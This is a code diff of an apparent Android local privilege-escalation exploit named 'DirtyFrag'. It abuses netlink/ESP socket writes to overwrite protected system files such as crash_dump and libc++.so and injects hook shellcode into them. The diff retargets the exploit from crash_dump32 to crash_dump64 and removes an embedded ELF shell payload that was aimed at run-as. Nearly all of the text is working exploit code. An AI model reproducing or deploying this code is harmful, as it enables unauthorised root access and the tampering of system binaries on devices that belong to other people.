@@ -36,24 +36,12 @@
 #define SOL_UDP 17
 #endif
 
-static const char kCrashDump32[] = "/apex/com.android.runtime/bin/crash_dump32";
+static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 
 #define ENC_PORT         4500
 #define SEQ_VAL          200
 #define REPLAY_SEQ       100
-#define TARGET_PATH      "/system/bin/run-as"
-#define PATCH_OFFSET     0
 #define PAYLOAD_LEN      128
-static const uint8_t shell_elf[PAYLOAD_LEN] = {
-    0x7F, 0x45, 0x4C, 0x46, 0x08, 0x12, 0x80, 0x52, 0x01, 0x00, 0x00, 0xD4, 0x07, 0x00, 0x00, 0x14,
-    0x03, 0x00, 0xB7, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x12, 0x80, 0x52, 0x01, 0x00, 0x00, 0xD4,
-    0x08, 0x00, 0x00, 0x14, 0x00, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x01, 0x00, 0x10, 0x05, 0x00, 0x00, 0x14, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x1B, 0x80, 0x52, 0x01, 0x00, 0x00, 0xD4,
-    0x2F, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x00
-};
 
 static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len) {
     struct rtattr *rta = (struct rtattr *) ((char *) nlh + NLMSG_ALIGN(nlh->nlmsg_len));
@@ -305,7 +293,7 @@ static int do_one_write(int file_fd, off_t offset, uint32_t spi, int use_helper)
                 PLOGE("setfd");
                 _exit(1);
             }
-            execl(kCrashDump32, "crashdump32", buf2, NULL);
+            execl(kCrashDump, "crashdump64", buf2, NULL);
             _exit(1);
         } else {
             //LOGD("pid: %d", pid);
@@ -503,7 +491,7 @@ int patch_cxx(int run_index) {
     uint64_t hook_offset, shellcode_offset;
     uint32_t first_insn;
     int ret;
-    ret = find_hook_target("/system/lib64/libc++.so",  "_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev", &hook_offset, &shellcode_offset, &first_insn);
+    ret = find_hook_target("/system/lib64/libc++.so",  "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_", &hook_offset, &shellcode_offset, &first_insn);
     if (ret) {
         LOGE("find_hook_target");
         return ret;
@@ -580,9 +568,9 @@ int patch_ko() {
     LOGD("patch1");
     size_t len = splice_helper_end - splice_helper_start;
     // "/vendor/lib/libstagefright_soft_g711dec.so"
-    LOGD("patching crashdump32");
+    LOGD("patching crashdump");
     int ret =
-    patch_file(kCrashDump32, splice_helper_start, len, 0, 0xdead0000, 0);
+    patch_file(kCrashDump, splice_helper_start, len, 0, 0xdead0000, 0);
 
     LOGD("patch1 ret %d", ret);
     if (ret)
@@ -603,7 +591,7 @@ JNIEXPORT jint JNICALL
 Java_org_lsposed_lspromise_DirtyFrag_patchMod(JNIEnv *env, jclass clazz) {
     LOGI("starting patchMod uid=%d", getuid());
     /*
-    int fd = open(kCrashDump32, O_RDONLY);
+    int fd = open(kCrashDump, O_RDONLY);
     LOGD("leaked crashdump32 fd %d", fd);
     struct stat st;
     fstat(fd, &st);
